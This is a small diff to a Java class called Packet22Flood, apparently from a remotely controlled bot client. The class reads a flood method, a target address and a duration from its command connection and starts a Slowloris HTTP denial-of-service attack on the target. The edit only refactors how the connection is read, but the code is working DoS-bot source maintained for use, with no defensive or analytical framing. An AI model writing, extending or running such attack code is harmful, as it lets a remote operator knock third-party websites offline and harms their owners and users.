@@ -15,9 +15,9 @@ public class Packet22Flood extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		int method = Connection.readInt();
-		String target = Connection.readLine();
-		int seconds = Connection.readInt();
+		int method = Connection.instance.readInt();
+		String target = Connection.instance.readLine();
+		int seconds = Connection.instance.readInt();
 
 		if (method == Flood.SLOWLORIS.getNumeric()) {
 			start(new Slowloris(target, Constants.HTTP_GET), seconds);
